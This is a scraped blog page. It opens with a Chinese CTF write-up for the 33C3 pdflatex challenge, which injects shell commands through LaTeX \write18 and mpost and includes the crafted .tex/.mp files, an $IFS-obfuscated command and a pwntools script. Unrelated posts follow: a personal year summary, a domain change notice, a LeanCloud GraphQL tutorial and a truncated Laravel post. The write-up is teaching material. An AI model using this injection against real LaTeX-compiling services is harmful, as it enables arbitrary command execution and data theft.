            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: Misc<br>Point: 75<br>Author: bruce30262 @ BambooFox</p>
<p>Description:<br>Just a tiny <a target="_blank" rel="noopener" href="https://gist.github.com/bruce30262/80b089e24d3a34862fe78892c63d8dcf">application</a>, that lets the user write some files and compile them with pdflatex.<br>What can possibly go wrong?<br>nc 78.46.224.91 24242</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>根據題目給的原始碼，我們可以得知這是一個可以讓使用者進行讀寫以及編譯檔案的 service。</p>
<ul>
<li><code>create</code>: 製作檔案，檔案類型有: <code>.log</code>, <code>.tex</code>, <code>.mb</code>, <code>.sty</code> &amp; <code>.bib</code></li>
<li><code>show</code>: 顯示指定的檔案內容</li>
<li><code>compile</code>: 使用 <code>pdflatext</code> 編譯一個檔案</li>
</ul>
<p>解題的過程中 <strong>mike</strong> 找到了一個有用的連結: <a target="_blank" rel="noopener" href="http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/">Pwning coworkers thanks to LaTeX</a></p>
<p>簡單來說就是透過製作惡意的 <code>.mp</code> 和 <code>.tex</code> 檔案，我們可以利用 <code>pdflatext</code> 在 compile 檔案的時候，透過執行 <code>mpost</code> 指令來達到執行任意 command 的效果。</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>基本上只要照著連結裡的方式做即可:</p>
<ol>
<li>create 一個惡意的 <code>.mp</code> 檔</li>
<li>create 一個惡意的 <code>.tex</code> 檔，將裡面的指令改為 <code>(cat$&#123;IFS&#125;$(ls|grep$&#123;IFS&#125;33C3))&gt;qqq.log</code>。這行 command 會將 flag 的內容存到 qqq.log 裡頭</li>
<li>透過 Compile 惡意的 <code>.tex</code> 檔來執行我們的 command</li>
<li>show qqq.log，得到 flag</li>
</ol>
<p>final exploit:</p>
<figure class="highlight txt"><figcaption><span>sss.mp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">verbatimtex</span><br><span class="line">\documentclass&#123;minimal&#125;\begin&#123;document&#125;</span><br><span class="line">etex beginfig (1) label(btex blah etex, origin);</span><br><span class="line">endfig; \end&#123;document&#125; bye</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><figcaption><span>aaa.tex</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\documentclass&#123;article&#125;\begin&#123;document&#125;</span><br><span class="line">\immediate\write18&#123;mpost -ini &quot;-tex=bash -c (cat$&#123;IFS&#125;$(ls|grep$&#123;IFS&#125;33C3))&gt;qqq.log&quot; &quot;sss.mp&quot;&#125;</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><figcaption><span>exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;78.46.224.91&quot;</span>, <span class="number">24242</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;creating sss.mp...&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;create mp sss&quot;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;sss.mp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    r.sendline(line.strip())</span><br><span class="line">r.sendline(<span class="string">&quot;\q&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;creating aaa.tex...&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;create tex aaa&quot;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;aaa.tex&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    r.sendline(line.strip())</span><br><span class="line">r.sendline(<span class="string">&quot;\q&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;compile aaa&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;show log qqq&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>Don’t take LaTEX files from strangers!!</strong></p>
<p>flag: <code>33C3_pdflatex_1s_t0t4lly_s3cur3!</code></p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/2016-12-31-summary-of-2016/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/2016-12-31-summary-of-2016/" itemprop="url">2016 年度小结</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-31T00:00:00+08:00">
                2016-12-31
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p>转眼间又一年过去了，说实话，我的 2016 年并不是非常有趣，这一整年我都是一个人住在昆山，显得有些单调，而且因为刚刚写了一篇「20 岁的我在想些什么」，所以可以写在年度小结中的内容实在是不多了。</p>
<p>因为皮蛋豆腐需要照顾，原打算春节就不回家了，但后来计划有变，我提前了一周休假回家，拜托同事帮忙照顾皮蛋豆腐。然后在家待了一周，除夕赶回苏州 —— 再帮忙照顾同事家的两只猫，这也是我第一次一个人过除夕，有了皮蛋豆腐现在并不能很随意的出游算是一个遗憾，虽然自动喂食机和滤水器还是能应付一到两天的。</p>
<p>今年年初皮蛋豆腐分别做了绝育手术，一切也还算顺利。很多人说猫绝育后会变胖，因为我喜欢身手矫健的猫咪，所以我对皮蛋豆腐的体重还是很在意的，于是一整年我都在用厨房秤精确地控制它们的猫粮，最后它们的体重稳定在了 3.5 千克，我还是很满意的。皮蛋豆腐长大成为成年猫咪之后比之前稳重了一些，但依然还是会撕开我的零食、在房间里跳来跳去，所以我还是不得不在一些时候把它们关到阳台上。</p>
<p>今年作息时间规律了一些，虽然依然是晚睡晚起，但相比之前两年还是规律了很多。晚上睡不着觉的问题依旧没什么改善，而第二天早上又要上班，这一度导致在上半年我的平均睡眠时间只有六个半小时；后来下半年因为意识到了视力的重要性，将睡觉时间提前了一些，睡不着就在听一档关于英语学习的播客，效果还不错；今年的最后两个月，我的房子附近开始有非常大的噪音 —— 每天天还没亮就会放半个小时礼炮，令我十分抓狂，如果这种状况持续下去，我可能不得不提前离开苏州了。</p>
<p>三月初和公司一起去了一趟越南芽庄，很久没有这样连续安排一周的行程了，虽然一直在海边，但我除了在水深不超过一米的岸边划了划船之外并没有下水。不过越南的海鲜还是挺好吃的，让我觉得以前不爱吃海鲜大概只是因为没吃到好吃或新鲜的缘故。这也是我第一次离开中国到另外一个国家，让我感到不同国家、不同民族之间，有一些地方是那么地相似，又有一些地方则截然不同。</p>
<p>今年我发现我在线上发展粉丝遇到了一些瓶颈，也很长时间没有结识新朋友了 —— 无论是线上还是线下，这不是一个好现象，于是我尝试去线下活动做演讲来「刷脸」，今年一共在四次线下活动做了技术分享，都是在杭州：Connext、稀土 Meetup，以及 Node Patry 的两次活动。因为之前在公司内部做的几次技术分享，已经有了一些制作幻灯片的经验，但第一次面对台下几十个人的时候还是有点慌，第一次在 Connext 的技术分享效果并不是很好，一方面是我过于紧张，另一方面是选题也显得不是很恰当，但之后的几次活动效果都还不错，也认识了一些新的有趣的朋友。</p>
<p>今年我花了很多时间在听播客上面，我在听 IPN 的「太医来了」、「选美」、「味之道」，也在听「内核恐慌」、「代码时间」、「Teahour」。听着听着总是有自己录一档的冲动，终于在经过了很多的准备工作之后，在八月初将这个想法付诸了行动，也就是后来的「彩排」播客。相比于写文章，录制博客是一种完全不同的体验：你后期修改的空间很小，一旦有错误要么重录要么只能将就，其实彩排的每期博客我都录了三遍以上，以便能剪辑出一个较好的版本；同时它对听众的要求也很高，听众必须拿出相对整块的时间来收听你的博客，而不能像看文章一样语言扫过，而且有听播客习惯的人也相对较少。</p>
<p>在去年年末买了摩卡壶之后，我才意识到咖啡是分成美式和意式的，后来也折腾了不同的咖啡豆，再后来双十二趁着打折还买了一个意式半自动咖啡机。我也花了很多时间在游戏上面，包括年中发布的守望先锋，但更多的还是 Steam 上一些「盖房子」的独立游戏。</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/migrate-to-new-domain-blessing-studio/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/migrate-to-new-domain-blessing-studio/" itemprop="url">博客启用新域名 Blessing.Studio</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-25T13:54:00+08:00">
                2016-12-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%97%A5%E5%B8%B8/" itemprop="url" rel="index">
                    <span itemprop="name">日常</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>原来的域名 <code>prinzeugen.net</code> 一直被人吐槽说不好记，但苦于没有什么中意的其他的好记的域名，所以换域名的计划就一直搁置着。</p>
<p>其实我以前就听说过 <code>.studio</code> 这个顶级域名了，但是当时（15 年中旬）还没有开放注册，所以后来也就忘却了它的存在。然而几天前在机缘巧合下我得知了它早在 2015.10 就已经开放注册了，并且现在一年只要百来块就能搞到，于是……</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/migrate-to-new-domain-blessing-studio/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/2016-12-24-leancloud-graphql/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/2016-12-24-leancloud-graphql/" itemprop="url">在 LeanCloud 中使用 GraphQL</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-24T00:00:00+08:00">
                2016-12-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p><a target="_blank" rel="noopener" href="http://graphql.org/">GraphQL</a> 是 FaceBook 开源的一套数据查询语言，也是 <a target="_blank" rel="noopener" href="https://facebook.github.io/relay/">Relay</a> 钦定的组件，可以在客户端以一种非常灵活的语法来获取数据，但目前支持 GraphQL 的服务还比较少，最近 <a target="_blank" rel="noopener" href="http://githubengineering.com/the-github-graphql-api/">GitHub 也宣布了其开放 API 支持了 GraphQL</a>。</p>
<p>因为 GraphQL 的支持需要服务器端的更改，因此我选择了在 LeanCloud 的数据服务的基础上用 Node.js 编写一个中间层，运行在云引擎上，将 GraphQL 的查询翻译成对 LeanCloud SDK 的调用，为客户端提供 GraphQL 支持。</p>
<p>我也参考了其他语言和框架的 GraphQL 支持，它们都需要开发者进行很多的开发或配置工作。这是因为无论在 MySQL 还是 MongoDB 中都并没有记录数据之间的关联关系（Id 和 ObjectId 都不会记录指向的表或集合，MySQL 的外键倒是会记录，但可惜用户不多）；而且即使你定义了数据之间的关联，你还是需要去定义权限 —— 哪些用户可以访问哪些数据。</p>
<p>而 LeanCloud 的 Relation 和 Pointer 都记录了所指向的 Class，同时 LeanCloud 本身也有一套基于 sessionToken 和 ACL 的权限控制机制，因此我们完全可以做到从 LeanCloud 的数据服务获取数据之间的管理，然后遵循现有的 ACL 来自动实现对 GraphQL 的支持。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/leancloud/leancloud-graphql">leancloud-graphql</a> 就是这样的一个项目，你只需将它部署到云引擎上，不需要改动一行代码，便可以用 GraphQL 查询你在 LeanCloud 上的所有数据。</p>
<p>相较于 RESTful 和 SQL，GraphQL 为数据定义了严格的类型，你可以使用这样一个灵活的语言将数据通过关系组合起来，所见即所得地得到你想要的数据。得益于 GraphQL 的类型系统，你还可以在调试工具（<a target="_blank" rel="noopener" href="https://graphql.leanapp.cn/">graphql.leanapp.cn</a>）中得到精确的错误提示和补全建议。</p>
<p>例如这里我们查询 Todo 这个 Class 中按优先级排序的前两条数据，获取 title、priority，并将 owner 这个 Pointer 展开：</p>
<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  Todo<span class="punctuation">(</span><span class="symbol">ascending</span><span class="punctuation">:</span> priority, <span class="symbol">limit</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    title, priority, owner <span class="punctuation">&#123;</span></span><br><span class="line">      username</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="title class_">Todo</span>: [&#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&quot;紧急 Bug 修复&quot;</span>,</span><br><span class="line">    <span class="attr">priority</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">owner</span>: &#123;</span><br><span class="line">      <span class="attr">username</span>: <span class="string">&quot;someone&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&quot;打电话给 Peter&quot;</span>,</span><br><span class="line">    <span class="attr">priority</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">owner</span>: &#123;</span><br><span class="line">      <span class="attr">username</span>: <span class="string">&quot;someone&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目前 leancloud-graphql 已经实现了 LeanCloud 中大部分的查询参数和查询条件，你可以任意地组合这些条件。例如我们可以查询优先级大于 5 且存在 content 属性的数据：</p>
<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  Todo<span class="punctuation">(</span><span class="symbol">exists</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="symbol">content</span><span class="punctuation">:</span> <span class="literal">true</span><span class="punctuation">&#125;</span>, <span class="symbol">greaterThan</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="symbol">priority</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">    title, content, priority</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>GraphQL 最大的亮点还是对关系查询的支持，无论是 Relation 还是 Pointer 你都可以任意地展开，而不必受到 LeanCloud RESTful API 只能展开一层的限制。例如我们查询所有的 TodoFolder 中的 Todo（Relation）并展开 owner（Pointer）：</p>
<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  TodoFolder <span class="punctuation">&#123;</span></span><br><span class="line">    name,</span><br><span class="line">    containedTodos <span class="punctuation">&#123;</span></span><br><span class="line">      title, owner <span class="punctuation">&#123;</span></span><br><span class="line">        username, email</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>结果（省略了一部分）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="title class_">TodoFolder</span>: [&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;工作&quot;</span>,</span><br><span class="line">    <span class="attr">containedTodos</span>: [&#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;紧急 Bug 修复&quot;</span>,</span><br><span class="line">      <span class="attr">owner</span>: &#123;</span><br><span class="line">        <span class="attr">username</span>: <span class="string">&quot;someone&quot;</span>,</span><br><span class="line">        <span class="attr">email</span>: <span class="string">&quot;test@example.com&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="comment">// ...</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;, <span class="comment">// ...</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你也可以在关系查询上附加查询参数或条件。例如我们查询所有 TodoFolder 中优先级最高的一个 Todo：</p>
<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  TodoFolder <span class="punctuation">&#123;</span></span><br><span class="line">    name, containedTodos<span class="punctuation">(</span><span class="symbol">limit</span><span class="punctuation">:</span> <span class="number">1</span>, <span class="symbol">ascending</span><span class="punctuation">:</span> priority<span class="punctuation">)</span> <span class="punctuation">&#123;</span></span><br><span class="line">      title, priority</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="title class_">TodoFolder</span>: [&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;工作&quot;</span>,</span><br><span class="line">    <span class="attr">containedTodos</span>: [</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">&quot;紧急 Bug 修复&quot;</span>, <span class="attr">priority</span>: <span class="number">0</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;购物清单&quot;</span>,</span><br><span class="line">    <span class="attr">containedTodos</span>: [</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">&quot;买酸奶&quot;</span>, <span class="attr">priority</span>: <span class="number">10</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;someone&quot;</span>,</span><br><span class="line">    <span class="attr">containedTodos</span>: [</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">&quot;紧急 Bug 修复&quot;</span>, <span class="attr">priority</span>: <span class="number">0</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在实现一对多关系时，我们经常会在「多」上面保存一个到「一」的指针，例如一个 Todo 会有一个叫 owner 的 Pointer 指向用户表。在这时，leancloud-graphql 会自动在用户表上添加一个叫 ownerOfTodo 的属性用来表示这个反向关系，你可以像展开一个 Relation 一样展开这个反向关系，例如我们查询每个用户的 Todo 并展开 title：</p>
<figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">query</span> <span class="punctuation">&#123;</span></span><br><span class="line">  _User <span class="punctuation">&#123;</span></span><br><span class="line">    username, ownerOfTodo <span class="punctuation">&#123;</span></span><br><span class="line">      title</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">_User</span>: [&#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&quot;someone&quot;</span>,</span><br><span class="line">    <span class="attr">ownerOfTodo</span>: [</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">&quot;紧急 Bug 修复&quot;</span>&#125;,</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">&quot;打电话给 Peter&quot;</span>&#125;,</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">&quot;还信用卡账单&quot;</span>&#125;,</span><br><span class="line">      &#123;<span class="attr">title</span>: <span class="string">&quot;买酸奶&quot;</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对 <a target="_blank" rel="noopener" href="https://github.com/leancloud/leancloud-graphql">leancloud-graphql</a> 的简单介绍就到这里，更多使用方法和功能介绍可以在项目的 GitHub 主页上看到，这个项目本身也是开源的。</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/the-best-method-to-use-whoops-in-laravel/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/the-best-method-to-use-whoops-in-laravel/" itemprop="url">Laravel 使用 whoops 处理错误最优雅的姿势</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-22T23:00:45+08:00">
                2016-12-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
